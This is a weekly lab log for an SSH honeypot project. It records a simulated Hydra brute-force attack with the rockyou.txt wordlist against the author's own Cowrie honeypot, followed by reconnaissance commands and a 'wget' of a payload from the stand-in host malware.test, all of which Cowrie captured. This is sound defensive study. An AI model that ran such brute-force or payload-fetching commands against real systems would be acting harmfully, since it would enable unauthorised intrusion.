# Week 2 — Exposure and Data Capture

## Objective
Safely expose the honeypot to a controlled attack simulation 
and verify that all attacker activity is being captured.

## What I Did

### 1. Brute Force Attack using Hydra
- Used Hydra on Kali to brute force SSH passwords
- Targeted port 2222 (Cowrie honeypot)
- Used rockyou.txt wordlist
- Result: 3 valid passwords found

### 2. Manual SSH Attack
- Connected to honeypot using found credentials
- Honeypot accepted login and gave fake shell
- Hostname showed as `vitals-monitor-04` ✅

### 3. Attacker Commands Executed
- `whoami` — checked current user
- `ls /root` — explored file system
- `ps aux` — listed running processes
- `netstat -an` — scanned network connections
- `wget http://malware.test/payload.sh` — attempted malware download

### 4. Verified Log Capture
- All commands logged in `cowrie.log`
- All events stored in `cowrie.json`
- Attacker IP, passwords and commands all captured

## Result
Successfully captured brute force attempts, login credentials 
and attacker commands without the attacker knowing.

## Evidence
- `logs/cowrie.log` — full attack log
- `logs/cowrie.json` — structured JSON log

## Tools Used
- Hydra — brute force tool
- rockyou.txt — password wordlist
- Cowrie — honeypot logging
